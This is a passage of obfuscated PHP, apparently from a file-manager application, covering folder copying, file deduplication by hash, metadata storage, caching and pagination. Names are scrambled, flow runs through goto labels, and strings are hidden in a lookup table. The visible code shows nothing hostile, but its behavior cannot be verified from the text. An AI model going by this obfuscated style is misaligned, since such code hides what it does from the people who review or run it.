$dƒ„¨ÆÈ˜˜[557]) { return; } $aëºëÀ±›ô = array($dƒ„¨ÆÈ˜˜[481] => array($dƒ„¨ÆÈ˜˜[507], $FÈÎï¬ …Í[$dƒ„¨ÆÈ˜˜[481]] . $bãš…¤†ìç . $dƒ„¨ÆÈ˜˜[508])); $F‹ç½§íŠ = $this->field($dƒ„¨ÆÈ˜˜[404])->where($aëºëÀ±›ô)->getField($dƒ„¨ÆÈ˜˜[390], !0); goto EôÜ²ñ³ƒß; EôÜ²ñ³ƒß: if (!$F‹ç½§íŠ) { return; } $aëºëÀ±›ô = array($dƒ„¨ÆÈ˜˜[390] => array($dƒ„¨ÆÈ˜˜[7], $F‹ç½§íŠ), $dƒ„¨ÆÈ˜˜[469] => 1); $f‚¸õ‚Ë‡ = Model($dƒ„¨ÆÈ˜˜[558])->field($dƒ„¨ÆÈ˜˜[462])->where($aëºëÀ±›ô)->select(); goto cÀ³ÌÉÜ­à; cÀ³ÌÉÜ­à: if (!$f‚¸õ‚Ë‡) { return; } $f‚¸õ‚Ë‡ = array_to_keyvalue($f‚¸õ‚Ë‡, $dƒ„¨ÆÈ˜˜[33], $dƒ„¨ÆÈ˜˜[462]); $aëºëÀ±›ô = array($dƒ„¨ÆÈ˜˜[462] => array($dƒ„¨ÆÈ˜˜[7], $f‚¸õ‚Ë‡)); goto BŒÛ…¹åÏì; C‹«èº‰®ß: $dƒ„¨ÆÈ˜˜ =& $_SERVER[ÉóçÄÇ]; $FÈÎï¬ …Í = $this->sourceInfo($bãš…¤†ìç); $f×†½Ô¡¸Š = $this->sourceInfo($c÷ƒ·Ü‘Æ ); goto fÀš±Î·å¶; B°æ‹²œ¹: } public function copyFolderFromIO($Bâ³×¥Ë‡, $Bˆˆä…Š‹, $fœÇ¯µ–˜İ, $EÊÙ¬†ˆŸ, $eè¥óšÌ¡è, $B¦ê¦äÜİö = false) { goto Dâ¥ÏÔçæƒ; A›‹¥½ïÅÇ: Model($c®¶¸Ï‹È÷[444])->linkAdd($E‹®£™˜Š­[$c®¶¸Ï‹È÷[524]]); Model($c®¶¸Ï‹È÷[444])->remove($E‹®£™˜Š­[$c®¶¸Ï‹È÷[560]]); $this->folderSizeReset($fœÇ¯µ–˜İ); goto Aœˆåğó™; b¢ŠºôõŸ: Model($c®¶¸Ï‹È÷[527])->addAll($E‹®£™˜Š­[$c®¶¸Ï‹È÷[525]], array(), !0); Model($c®¶¸Ï‹È÷[528])->eventCopy($DÑ•“ô³Šß); $this->saveAll($E‹®£™˜Š­[$c®¶¸Ï‹È÷[526]]); goto A›‹¥½ïÅÇ; Eö¢²Ô‘ÒŠ: Hook::trigger($c®¶¸Ï‹È÷[562]); if ($DÑ•“ô³Šß) { $this->folderSizeResetChildren($DÑ•“ô³Šß); } $this->_childrenListClear(); goto b¢ŠºôõŸ; Dâ¥ÏÔçæƒ: $c®¶¸Ï‹È÷ =& $_SERVER[ÉóçÄÇ]; $E‹®£™˜Š­ = array($c®¶¸Ï‹È÷[525] => array(), $c®¶¸Ï‹È÷[526] => array(), $c®¶¸Ï‹È÷[524] => array(), $c®¶¸Ï‹È÷[560] => array()); $DÇ¶¾öùÔÃ = $B¦ê¦äÜİö ? $B¦ê¦äÜİö : $Bâ³×¥Ë‡->pathThis($Bˆˆä…Š‹); goto DÈêºò°”‰; DÈêºò°”‰: $eÀ›ëëšÀœ = $this->fileNameExist($fœÇ¯µ–˜İ, $DÇ¶¾öùÔÃ); $DÑ•“ô³Šß = $this->mkdir($fœÇ¯µ–˜İ, $DÇ¶¾öùÔÃ, $EÊÙ¬†ˆŸ); if (!$eÀ›ëëšÀœ || $EÊÙ¬†ˆŸ == REPEAT_RENAME_FOLDER) { $EÊÙ¬†ˆŸ = !1; } goto FŸŒ§ñ¤½£; FŸŒ§ñ¤½£: if ($eÀ›ëëšÀœ) { $this->_childrenAllMake($eÀ›ëëšÀœ); } Hook::trigger($c®¶¸Ï‹È÷[561]); $this->_copyChildTo($Bâ³×¥Ë‡, $Bˆˆä…Š‹, $DÑ•“ô³Šß, $EÊÙ¬†ˆŸ, $E‹®£™˜Š­, $eè¥óšÌ¡è); goto Eö¢²Ô‘ÒŠ; Aœˆåğó™: $this->updateModifyTime($fœÇ¯µ–˜İ); return $DÑ•“ô³Šß; goto CØ•Üšõàİ; CØ•Üšõàİ: } private function _copyChildTo($c¤º¸½Ò„ó, $fÂÚöøŠß, $c„˜äˆß‹, $A»‚Õ¸ó…ã, &$aâğó¬ºöâ, $DÀÍÉÌÑ¬¸) { goto d°«¨ù„¥; aô…¢ĞÖôŠ: $E¡İ¤çìèÁ = $this->_childrenList($c„˜äˆß‹); $E¡İ¤çìèÁ = array_to_keyvalue($E¡İ¤çìèÁ, $BˆÌÈ©ïõ[28]); foreach ($cŒêä¾šó¿ as $C´ñàÙ›˜) { $aİÌ°Àøê = $E¡İ¤çìèÁ[$C´ñàÙ›˜[$BˆÌÈ©ïõ[28]]]; $D·™Ö–‘–â = $aİÌ°Àøê[$BˆÌÈ©ïõ[390]]; $this->_copyApplyMeta($aİÌ°Àøê, $aâğó¬ºöâ); if ($C´ñàÙ›˜[$BˆÌÈ©ïõ[29]] == $BˆÌÈ©ïõ[76]) { $C´ñàÙ›˜[$BˆÌÈ©ïõ[75]] = $c¤º¸½Ò„ó->getPathInner($C´ñàÙ›˜[$BˆÌÈ©ïõ[75]]); $this->_copyChildTo($c¤º¸½Ò„ó, $C´ñàÙ›˜[$BˆÌÈ©ïõ[75]], $D·™Ö–‘–â, $A»‚Õ¸ó…ã, $aâğó¬ºöâ, $DÀÍÉÌÑ¬¸); } } goto A™Ä¥ŠĞ»ç; d°«¨ù„¥: $BˆÌÈ©ïõ =& $_SERVER[ÉóçÄÇ]; $aŒ¯š÷ƒÅ = $this->sourceInfoCache($c„˜äˆß‹); $Cœ¦ÉÍ¬ãƒ = $c¤º¸½Ò„ó->listPath($fÂÚöøŠß); goto A“ŞÌÚø´; D”‡Íë´¿×: foreach ($cŒêä¾šó¿ as &$C´ñàÙ›˜) { goto e¥¨ç§‰ìö; e¥¨ç§‰ìö: if (isset($fÂÙ‹˜õ[$C´ñàÙ›˜[$BˆÌÈ©ïõ[28]]])) { $C´ñàÙ›˜ = $fÂÙ‹˜õ[$C´ñàÙ›˜[$BˆÌÈ©ïõ[28]]]; } $C´ñàÙ›˜[$BˆÌÈ©ïõ[397]] = $C´ñàÙ›˜[$BˆÌÈ©ïõ[29]] == $BˆÌÈ©ïõ[76]; $C´ñàÙ›˜[$BˆÌÈ©ïõ[399]] = _get($C´ñàÙ›˜, $BˆÌÈ©ïõ[167], $BˆÌÈ©ïõ[33]); goto A¿ËøêŠœõ; A¿ËøêŠœõ: $C´ñàÙ›˜[$BˆÌÈ©ïõ[77]] = _get($C´ñàÙ›˜, $BˆÌÈ©ïõ[77], 0); $C´ñàÙ›˜[$BˆÌÈ©ïõ[441]] = _get($C´ñàÙ›˜, $BˆÌÈ©ïõ[441], 0); if (!isset($C´ñàÙ›˜[$BˆÌÈ©ïõ[563]]) && $C´ñàÙ›˜[$BˆÌÈ©ïõ[441]]) { $aâğó¬ºöâ[$BˆÌÈ©ïõ[560]][] = $C´ñàÙ›˜[$BˆÌÈ©ïõ[441]]; } goto e¿õìŞ¨ö‚; e¿õìŞ¨ö‚: if ($A»‚Õ¸ó…ã) { $c¤®Ş™äÄ = $this->fileNameExistCache($c„˜äˆß‹, $C´ñàÙ›˜[$BˆÌÈ©ïõ[28]]); if ($c¤®Ş™äÄ) { if ($C´ñàÙ›˜[$BˆÌÈ©ïõ[397]] || $A»‚Õ¸ó…ã == REPEAT_SKIP) { continue; } if ($A»‚Õ¸ó…ã == REPEAT_REPLACE) { $aİÌ°Àøê = $this->sourceInfoCache($c¤®Ş™äÄ); $C¬¦…§¡ÕÒ = $this->fileHistory($aİÌ°Àøê, $C´ñàÙ›˜[$BˆÌÈ©ïõ[441]], $C´ñàÙ›˜[$BˆÌÈ©ïõ[77]]); if ($C¬¦…§¡ÕÒ) { $aâğó¬ºöâ[$BˆÌÈ©ïõ[524]][] = $C´ñàÙ›˜[$BˆÌÈ©ïõ[441]]; } continue; } else { if ($A»‚Õ¸ó…ã == REPEAT_RENAME) { $C´ñàÙ›˜[$BˆÌÈ©ïõ[28]] = $this->fileNameAutoCache($c„˜äˆß‹, $C´ñàÙ›˜[$BˆÌÈ©ïõ[28]], $A»‚Õ¸ó…ã, !1); } } } } if (!$C´ñàÙ›˜[$BˆÌÈ©ïõ[397]] && $C´ñàÙ›˜[$BˆÌÈ©ïõ[441]]) { $aâğó¬ºöâ[$BˆÌÈ©ïõ[524]][] = $C´ñàÙ›˜[$BˆÌÈ©ïõ[441]]; } $f²¦°ªŸ¸[] = $this->_makeItemData($C´ñàÙ›˜, $aŒ¯š÷ƒÅ, $C´ñàÙ›˜[$BˆÌÈ©ïõ[28]]); goto aË¹Œí›ğ«; aË¹Œí›ğ«: } unset($C´ñàÙ›˜); if (!empty($f²¦°ªŸ¸)) { $this->addAll($f²¦°ªŸ¸); $this->_childrenListSelect($c„˜äˆß‹); } goto aô…¢ĞÖôŠ; A“ŞÌÚø´: $cŒêä¾šó¿ = array_merge($Cœ¦ÉÍ¬ãƒ[$BˆÌÈ©ïõ[73]], $Cœ¦ÉÍ¬ãƒ[$BˆÌÈ©ïõ[74]]); $fÂÙ‹˜õ = $this->_addFiles($c¤º¸½Ò„ó, $Cœ¦ÉÍ¬ãƒ[$BˆÌÈ©ïõ[73]], $DÀÍÉÌÑ¬¸); $f²¦°ªŸ¸ = array(); goto D”‡Íë´¿×; A™Ä¥ŠĞ»ç: } private function _addFiles($AÙ™¯£ì, $CÆÊè¡ñ¡, $cæó¼¡×è‚) { goto CÉØåßµ‘; fØ“äï³‚Í: foreach ($D‚¤ø°ŸØÃ as $FÛ®°Ïº¿á) { if (!isset($F¨½Ÿ„ËÓ“[$FÛ®°Ïº¿á[$aÇ„†‡óŠÂ[169]]])) { continue; } $CŸ©„²¸¢ = $F¨½Ÿ„ËÓ“[$FÛ®°Ïº¿á[$aÇ„†‡óŠÂ[169]]]; foreach ($CŸ©„²¸¢ as &$D——ÈÑóŸÊ) { $D——ÈÑóŸÊ[$aÇ„†‡óŠÂ[441]] = $FÛ®°Ïº¿á[$aÇ„†‡óŠÂ[441]]; $D——ÈÑóŸÊ[$aÇ„†‡óŠÂ[563]] = !0; } unset($D——ÈÑóŸÊ); } $D–é‡¶…ÔŸ = array(); foreach ($CÆÊè¡ñ¡ as $f§ƒ©‚©ó) { if (isset($f§ƒ©‚©ó[$aÇ„†‡óŠÂ[563]]) && $f§ƒ©‚©ó[$aÇ„†‡óŠÂ[563]]) { continue; } $F–‰¤–•‹å = $AÙ™¯£ì->getPathInner($f§ƒ©‚©ó[$aÇ„†‡óŠÂ[75]]); $bª“Ş‹¯ = $Fœ±òÏâ‡…->addFileMake($F–‰¤–•‹å, $f§ƒ©‚©ó[$aÇ„†‡óŠÂ[77]], $f§ƒ©‚©ó[$aÇ„†‡óŠÂ[170]], $f§ƒ©‚©ó[$aÇ„†‡óŠÂ[169]], $f§ƒ©‚©ó[$aÇ„†‡óŠÂ[28]], $cæó¼¡×è‚); $D–é‡¶…ÔŸ[] = $bª“Ş‹¯; } goto d‰àÇø˜‰è; F·òƒÃÌÈÇ: $Fœ±òÏâ‡… = Model($aÇ„†‡óŠÂ[566]); $D‚¤ø°ŸØÃ = $Fœ±òÏâ‡…->where($AÒ…‘³è“Ì)->select(); $D‚¤ø°ŸØÃ = $D‚¤ø°ŸØÃ ? $D‚¤ø°ŸØÃ : array(); goto fØ“äï³‚Í; bÂøó÷¿›á: $D‚¤ø°ŸØÃ = $D‚¤ø°ŸØÃ ? $D‚¤ø°ŸØÃ : array(); foreach ($D‚¤ø°ŸØÃ as $FÛ®°Ïº¿á) { if (!isset($F¨½Ÿ„ËÓ“[$FÛ®°Ïº¿á[$aÇ„†‡óŠÂ[169]]])) { continue; } $E«±ç÷¯è =& $F¨½Ÿ„ËÓ“[$FÛ®°Ïº¿á[$aÇ„†‡óŠÂ[169]]]; foreach ($E«±ç÷¯è as &$D——ÈÑóŸÊ) { $D——ÈÑóŸÊ[$aÇ„†‡óŠÂ[441]] = $FÛ®°Ïº¿á[$aÇ„†‡óŠÂ[441]]; } unset($D——ÈÑóŸÊ); } $aÆÇ¦î±«ñ = array(); goto d±ÚÌŸôõ¯; d±ÚÌŸôõ¯: foreach ($CÆÊè¡ñ¡ as $CÔ«¸ãô‰¨) { $aÆÇ¦î±«ñ[$CÔ«¸ãô‰¨[$aÇ„†‡óŠÂ[28]]] = $CÔ«¸ãô‰¨; } return $aÆÇ¦î±«ñ; goto bì¨Íõ—Ç™; CÉØåßµ‘: $aÇ„†‡óŠÂ =& $_SERVER[ÉóçÄÇ]; if (!$CÆÊè¡ñ¡ || count($CÆÊè¡ñ¡) == 0) { return array(); } $F¨½Ÿ„ËÓ“ = array(); goto DßÏÃ·åáÄ; DßÏÃ·åáÄ: foreach ($CÆÊè¡ñ¡ as &$D——ÈÑóŸÊ) { goto B‚Ù„ƒ„‚Š; F­¬«ìÀÍè: $D——ÈÑóŸÊ[$aÇ„†‡óŠÂ[169]] = $dÍã—êêë; Hook::trigger($aÇ„†‡óŠÂ[565], $D——ÈÑóŸÊ); $F¨½Ÿ„ËÓ“[$dÍã—êêë][] =& $D——ÈÑóŸÊ; goto c§Ù˜ğ˜—; c§Ù˜ğ˜—: if (count($F¨½Ÿ„ËÓ“[$dÍã—êêë]) > 1) { $D——ÈÑóŸÊ[$aÇ„†‡óŠÂ[563]] = !0; } goto D©‹ìÆ¿; B‚Ù„ƒ„‚Š: Hook::trigger($aÇ„†‡óŠÂ[564], $D——ÈÑóŸÊ); $D——ÈÑóŸÊ[$aÇ„†‡óŠÂ[75]] = $AÙ™¯£ì->getPathInner($D——ÈÑóŸÊ[$aÇ„†‡óŠÂ[75]]); $C©—ä²âÏŞ = $AÙ™¯£ì->hashSimple($D——ÈÑóŸÊ[$aÇ„†‡óŠÂ[75]]); goto A‹Ï°Ï£òë; A‹Ï°Ï£òë: $dÍã—êêë = $AÙ™¯£ì->hashMd5($D——ÈÑóŸÊ[$aÇ„†‡óŠÂ[75]]); if (strlen($dÍã—êêë) > 10 && !isset($F¨½Ÿ„ËÓ“[$dÍã—êêë])) { $F¨½Ÿ„ËÓ“[$dÍã—êêë] = array(); } $D——ÈÑóŸÊ[$aÇ„†‡óŠÂ[170]] = $C©—ä²âÏŞ; goto F­¬«ìÀÍè; D©‹ìÆ¿: } unset($D——ÈÑóŸÊ); $AÒ…‘³è“Ì = array($aÇ„†‡óŠÂ[169] => array($aÇ„†‡óŠÂ[7], array_keys($F¨½Ÿ„ËÓ“))); goto F·òƒÃÌÈÇ; d‰àÇø˜‰è: $Fœ±òÏâ‡…->addAll($D–é‡¶…ÔŸ); $AÒ…‘³è“Ì = array($aÇ„†‡óŠÂ[169] => array($aÇ„†‡óŠÂ[7], array_keys($F¨½Ÿ„ËÓ“))); $D‚¤ø°ŸØÃ = $Fœ±òÏâ‡…->where($AÒ…‘³è“Ì)->select(); goto bÂøó÷¿›á; bì¨Íõ—Ç™: } } define($_SERVER[ÉóçÄÇ][567], $_SERVER[ÉóçÄÇ][568]); goto Cô¯ÉºÀâ; e¼—à¯õÉ¡: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\x79\x54\x69\x6d\x65", "\164\151\x6d\145", "\151\156\x73\x65\162\x74\54\x75\x70\144\x61\164\x65", "\x66\x75\156\143\x74\151\157\156"), array("\x63\x72\145\141\x74\145\x54\151\x6d\x65", "\164\151\x6d\x65", "\151\156\x73\145\162\x74", "\x66\x75\x6e\143\164\x69\x6f\156")); public function setDataAuto($b„ÂÖÂÚåğ) { $this->dataAuto = $b„ÂÖÂÚåğ; } public function __construct($aÜçà“¯˜¤ = '', $D·¹æŸÎä® = '', $E»Ç›“ÏÁä = '') { parent::__construct($aÜçà“¯˜¤, $D·¹æŸÎä®, $E»Ç›“ÏÁä); } public static function textEncode($AÄÛáÓèÌ†) { if (!$AÄÛáÓèÌ†) { return $AÄÛáÓèÌ†; } $DÃøîÙ„øÈ = json_encode($AÄÛáÓèÌ†); $DÃøîÙ„øÈ = preg_replace_callback($_SERVER[ÉóçÄÇ][351], function ($DŞœƒïãœ) { return addslashes($DŞœƒïãœ[0]); }, $DÃøîÙ„øÈ); return json_decode($DÃøîÙ„øÈ); } public static function textDecode($dñğöŒøæ§) { $AŒ·±Â†¤ =& $_SERVER[ÉóçÄÇ]; $eéƒİ³§í‘ = json_encode($dñğöŒøæ§); $eéƒİ³§í‘ = preg_replace_callback($AŒ·±Â†¤[352], function ($e¾²ÅÒ×ğâ) { return $_SERVER[ÉóçÄÇ][96]; }, $eéƒİ³§í‘); return json_decode($eéƒİ³§í‘); } protected $tableMeta = array(); protected function _beforeInsert(&$c»ä¹Ü¨©Î, $D„‡ôÀ“™Ğ) { $B°âíÅÈ³ =& $_SERVER[ÉóçÄÇ]; if (!$this->checkDataAutoHas($B°âíÅÈ³[353])) { return; } $this->dataBeforeFilter($c»ä¹Ü¨©Î, $B°âíÅÈ³[353]); } protected function _beforeUpdate(&$A¼·Ÿ¼Öğ¸, $DØ×Å ¦¡) { $fèÙ¯İ±Éä =& $_SERVER[ÉóçÄÇ]; if (!$this->checkDataAutoHas($fèÙ¯İ±Éä[354])) { return; } $this->dataBeforeFilter($A¼·Ÿ¼Öğ¸, $fèÙ¯İ±Éä[354]); } protected function _afterSelect(&$AÊ¼‡›ƒÛÛ, $FøÉÂ§«’) { if (!is_array($AÊ¼‡›ƒÛÛ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÉóçÄÇ][355])) { return; } foreach ($AÊ¼‡›ƒÛÛ as &$D „Ú›Ê–) { $this->dataAfterFilter($D „Ú›Ê–); } unset($D „Ú›Ê–); } protected function _afterFind(&$B‚ÃŒöø³á, $Eï»‹…ìŞ‘) { if (!is_array($B‚ÃŒöø³á)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÉóçÄÇ][355])) { return; } $this->dataAfterFilter($B‚ÃŒöø³á); } public function setAutoIncrement($Fƒ¤É¶ƒ­) { $e‘ÙùÓÖ”Ê = array($this->getPk() => $Fƒ¤É¶ƒ­); $cÖ Ñ§Ã‰Ş = $this->data($e‘ÙùÓÖ”Ê)->add(); if ($cÖ Ñ§Ã‰Ş) { $this->delete($cÖ Ñ§Ã‰Ş); } } public function getAutoIncrement() { $bØ«„Î´İ = $this->getTableName(); $BêŸ»í‡æÏ = $this->max($this->getPk()); $bµ‰ò«—Ú = $this->query("\163\x68\x6f\x77\x20\x74\141\142\x6c\x65\40\163\164\x61\164\x75\163\40\x77\150\145\x72\145\40\116\x61\155\145\x3d\x27{$bØ«„Î´İ}\47"); $e¨¹‰×’Ñ£ = $bµ‰ò«—Ú[0][$_SERVER[ÉóçÄÇ][356]]; $D´¿¨Ã¤º = max($BêŸ»í‡æÏ, $e¨¹‰×’Ñ£); return $D´¿¨Ã¤º; } protected function _callBefore($bí¤¬¤Ÿ—…, $bÀ÷‘ „æ‹) { return $this->cacheCallCheck($bí¤¬¤Ÿ—…, $bÀ÷‘ „æ‹, !1); } protected function _callAfter($a·’İ±İ¯, $A™¹ƒ‚Ü‡Á) { return $this->cacheCallCheck($a·’İ±İ¯, $A™¹ƒ‚Ü‡Á, !0); } protected function cacheFunctionAlias($FÈíÓóİóå) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($aîèçÙ«³, $aó‘îÊ¿†, $Eè„èù‰¢  = false) { $Dœ’¦Ü¦ß§ = $this->cacheFunctionAlias($aó‘îÊ¿†); if (!$Dœ’¦Ü¦ß§) { return; } foreach ($Dœ’¦Ü¦ß§ as $Cøê…æİÀ» => $aÈ¦°ØƒèŸ) { $F“ŞÁàŒƒğ = $aÈ¦°ØƒèŸ[0]; $C —³…ùâõ = explode($_SERVER[ÉóçÄÇ][47], $aÈ¦°ØƒèŸ[1]); if ($aîèçÙ«³ == $Cøê…æİÀ») { return $this->cacheFunctionGet($Cøê…æİÀ», $F“ŞÁàŒƒğ); } if ($Eè„èù‰¢  && in_array($aîèçÙ«³, $C —³…ùâõ)) { $this->cacheFunctionClear($Cøê…æİÀ», $F“ŞÁàŒƒğ); } } } public function cacheFunctionGet($eù¶± ŒÏç, $C‡µç¶Á¾) { $C©Ëì³ßë = $this->cacheKeyMake($eù¶± ŒÏç, $C‡µç¶Á¾); $E¤º¡¹Ôè• = Cache::get($C©Ëì³ßë); if (!is_array($E¤º¡¹Ôè•)) { $E¤º¡¹Ôè• = call_user_func_array(array($this, $eù¶± ŒÏç), array($C‡µç¶Á¾, !0)); Cache::set($C©Ëì³ßë, $E¤º¡¹Ôè•); } return $E¤º¡¹Ôè•; } public function cacheFunctionClear($cãÔØä…¼ø, $F¶²¬É£) { $Dô© °Ó‡ = $F¶²¬É£; if (!is_array($F¶²¬É£)) { $Dô© °Ó‡ = array($F¶²¬É£); } foreach ($Dô© °Ó‡ as $a“Óà³‰ğ) { $aÂ©¶×ùÚÛ = $this->cacheKeyMake($cãÔØä…¼ø, $a“Óà³‰ğ); Cache::remove($aÂ©¶×ùÚÛ); } } private function cacheKeyMake($a·‹ºß–¡Õ, $AÏ¹†ËºÂÀ) { $bñ Âùˆ¹ =& $_SERVER[ÉóçÄÇ]; return get_class($this) . $bñ Âùˆ¹[70] . $a·‹ºß–¡Õ . $bñ Âùˆ¹[357] . $AÏ¹†ËºÂÀ; } protected function selectPageReset() { $E«É¸¾º =& $_SERVER[ÉóçÄÇ]; if (isset($GLOBALS[$E«É¸¾º[358]])) { return; } $GLOBALS[$E«É¸¾º[358]] = isset($GLOBALS[$E«É¸¾º[7]][$E«É¸¾º[359]]) ? $GLOBALS[$E«É¸¾º[7]][$E«É¸¾º[359]] : !1; $GLOBALS[$E«É¸¾º[360]] = isset($GLOBALS[$E«É¸¾º[7]][$E«É¸¾º[349]]) ? $GLOBALS[$E«É¸¾º[7]][$E«É¸¾º[349]] : !1; $GLOBALS[$E«É¸¾º[7]][$E«É¸¾º[359]] = !1; $GLOBALS[$E«É¸¾º[7]][$E«É¸¾º[349]] = !1; } protected function selectPageRestore() { $C·´Í¥ã =& $_SERVER[ÉóçÄÇ]; if (!isset($GLOBALS[$C·´Í¥ã[358]])) { return; } $GLOBALS[$C·´Í¥ã[7]][$C·´Í¥ã[359]] = $GLOBALS[$C·´Í¥ã[358]]; $GLOBALS[$C·´Í¥ã[7]][$C·´Í¥ã[349]] = $GLOBALS[$C·´Í¥ã[360]]; unset($GLOBALS[$C·´Í¥ã[358]]); unset($GLOBALS[$C·´Í¥ã[360]]); } protected function selectPage($C—µ„Ä¿³‚ = 200, $e…’ï‘È¯¬ = 1) { goto d£Ûõ‘ŸŞ¯; d£Ûõ‘ŸŞ¯: $Fãßòô¹‹Ô =& $_SERVER[ÉóçÄÇ]; global $in; $c˜ˆâ±…Ì = $this->optionsValue(); goto eŞÕ×æÔ±; eŞÕ×æÔ±: $cÊ×õµà  = 50000; $C—µ„Ä¿³‚ = isset($in[$Fãßòô¹‹Ô[359]]) && $in[$Fãßòô¹‹Ô[359]] ? $in[$Fãßòô¹‹Ô[359]] : $C—µ„Ä¿³‚; if ($C—µ„Ä¿³‚ === -1) { $in[$Fãßòô¹‹Ô[359]] = !1; $cÊ×õµà  = 100000000; $C—µ„Ä¿³‚ = $cÊ×õµà ; } goto BÒ–¼ê‚; b‚Ï††äĞ: $C—µ„Ä¿³‚ = $C—µ„Ä¿³‚ <= 5 ? 5 : ($C—µ„Ä¿³‚ >= $cÊ×õµà  ? $cÊ×õµà  : $C—µ„Ä¿³‚); $e…’ï‘È¯¬ = intval(isset($in[$Fãßòô¹‹Ô[349]]) && $in[$Fãßòô¹‹Ô[349]] ? $in[$Fãßòô¹‹Ô[349]] : $e…’ï‘È¯¬); $e…’ï‘È¯¬ = $e…’ï‘È¯¬ <= 1 ? 1 : $e…’ï‘È¯¬; goto f‹È¹ßå·; a°åèéØˆØ: return $FŠ°²„òï; goto a”±Ú¦Ñô; Dïä‘éö÷: if (!is_array($a¹ŒÃ…•¢Œ)) { $a¹ŒÃ…•¢Œ = array(); } if ($A¶œõ¬´š² == 1) { $BğÁ›‚ŠŠÔ = count($a¹ŒÃ…•¢Œ); } $FŠ°²„òï = array($Fãßòô¹‹Ô[362] => array($Fãßòô¹‹Ô[363] => $BğÁ›‚ŠŠÔ, $Fãßòô¹‹Ô[359] => $C—µ„Ä¿³‚, $Fãßòô¹‹Ô[349] => $e…’ï‘È¯¬, $Fãßòô¹‹Ô[364] => $A¶œõ¬´š²), $Fãßòô¹‹Ô[365] => $a¹ŒÃ…•¢Œ); goto a°åèéØˆØ; BÒ–¼ê‚: $bŠÜÓ¥ÄÚµ = $c˜ˆâ±…Ì; $bŠÜÓ¥ÄÚµ[$Fãßòô¹‹Ô[361]] = array(); $C—µ„Ä¿³‚ = intval($C—µ„Ä¿³‚); goto b‚Ï††äĞ; f‹È¹ßå·: $a¹ŒÃ…•¢Œ = array(); $Cˆ‚ºœáŠ = 1; if ($e…’ï‘È¯¬ == 1 && $Cˆ‚ºœáŠ) { $this->optionsValue($c˜ˆâ±…Ì); $a¹ŒÃ…•¢Œ = $this->page($e…’ï‘È¯¬, $C—µ„Ä¿³‚)->select(); $BğÁ›‚ŠŠÔ = is_array($a¹ŒÃ…•¢Œ) ? count($a¹ŒÃ…•¢Œ) : 0; if ($BğÁ›‚ŠŠÔ < $C—µ„Ä¿³‚) { $A¶œõ¬´š² = 1; } else { $this->optionsValue($bŠÜÓ¥ÄÚµ); $BğÁ›‚ŠŠÔ = intval($this->count()); $A¶œõ¬´š² = ceil($BğÁ›‚ŠŠÔ / $C—µ„Ä¿³‚); } } else { $this->optionsValue($bŠÜÓ¥ÄÚµ); $BğÁ›‚ŠŠÔ = intval($this->count()); $A¶œõ¬´š² = ceil($BğÁ›‚ŠŠÔ / $C—µ„Ä¿³‚); $e…’ï‘È¯¬ = $e…’ï‘È¯¬ >= $A¶œõ¬´š² ? $A¶œõ¬´š² : $e…’ï‘È¯¬; $this->optionsValue($c˜ˆâ±…Ì); $a¹ŒÃ…•¢Œ = $this->page($e…’ï‘È¯¬, $C—µ„Ä¿³‚)->select(); } goto Dïä‘éö÷; a”±Ú¦Ñô: } protected function checkLength($aßô½Ô†Ù, $E§“»ºÇËÓ = 0, $C©Ô†–¿¹ = '') { $DïŞ‰™’Êã =& $_SERVER[ÉóçÄÇ]; $E§“»ºÇËÓ = $E§“»ºÇËÓ ? $E§“»ºÇËÓ : 65536; if (!$aßô½Ô†Ù || strlen($aßô½Ô†Ù) < $E§“»ºÇËÓ) { return; } $C©Ô†–¿¹ = $C©Ô†–¿¹ ? $C©Ô†–¿¹ . $DïŞ‰™’Êã[67] : $DïŞ‰™’Êã[33]; show_json($C©Ô†–¿¹ . LNG($DïŞ‰™’Êã[366]) . "\50{$E§“»ºÇËÓ}\x29", !1); } protected function metaSet($fšÅÛ©Ü¹¸, $CòÓ›ß‡Ë… = null, $e…ö¿µë¥ = null) { goto CË‰Ç–”–Ä; Cˆ¸ºëœŒª: $cÕÌ‰©ÆŠ± = $this->tableMeta[$CƒÛò±†ê[368]]; $CŸÒ‡ë¢ = Model($cÕÌ‰©ÆŠ±); $e›ÉùÕİ¾½ = array($Dœ÷²¤ïÍá => $fšÅÛ©Ü¹¸, $CƒÛò±†ê[369] => $CòÓ›ß‡Ë…); goto d¤Õ—¬Ã; CË‰Ç–”–Ä: $CƒÛò±†ê =& $_SERVER[ÉóçÄÇ]; if (!$this->tableMeta || !$fšÅÛ©Ü¹¸) { return !1; } $Dœ÷²¤ïÍá = $this->tableMeta[$CƒÛò±†ê[367]]; goto Cˆ¸ºëœŒª; FÛ©ßÑ: if (is_string($CòÓ›ß‡Ë…)) { $D’×»õà”µ[$CòÓ›ß‡Ë…] = $e…ö¿µë¥; } $bèöæ÷ÍÍ = array(); foreach ($D’×»õà”µ as $e‰‰Ö¯Û„› => $Eæ«åãºƒ) { $this->checkLength($Eæ«åãºƒ, !1, $cÕÌ‰©ÆŠ± . $CƒÛò±†ê[4] . $e‰‰Ö¯Û„›); $bèöæ÷ÍÍ[] = array($Dœ÷²¤ïÍá => $fšÅÛ©Ü¹¸, $CƒÛò±†ê[92] => $e‰‰Ö¯Û„›, $CƒÛò±†ê[370] => $Eæ«åãºƒ); } goto c…İ”º­Ã; d¤Õ—¬Ã: if (is_null($CòÓ›ß‡Ë…)) { return $CŸÒ‡ë¢->where(array($Dœ÷²¤ïÍá => $fšÅÛ©Ü¹¸))->delete(); } if (is_null($e…ö¿µë¥) && is_string($CòÓ›ß‡Ë…)) { return $CŸÒ‡ë¢->where($e›ÉùÕİ¾½)->delete(); } $D’×»õà”µ = is_array($CòÓ›ß‡Ë…) ? $CòÓ›ß‡Ë… : array(); goto FÛ©ßÑ; c…İ”º­Ã: $e¤Á¦¬ÊÆß = $CƒÛò±†ê[371] . $this->tableMeta; CacheLock::lock($e¤Á¦¬ÊÆß); $CŸÒ‡ë¢->where(array($Dœ÷²¤ïÍá => $fšÅÛ©Ü¹¸))->addAll($bèöæ÷ÍÍ, array(), !0); goto c†šìø±ØÅ; c†šìø±ØÅ: CacheLock::unlock($e¤Á¦¬ÊÆß); return !0; goto eÑÑê¡—¦Á; eÑÑê¡—¦Á: } public function metaGet($Fö×«øçš², $Eƒõç×©à‡ = false) { goto cã£œÎâ±; cã£œÎâ±: $c·ñéæ¸Ïì =& $_SERVER[ÉóçÄÇ]; if (!$this->tableMeta) { return array(); } 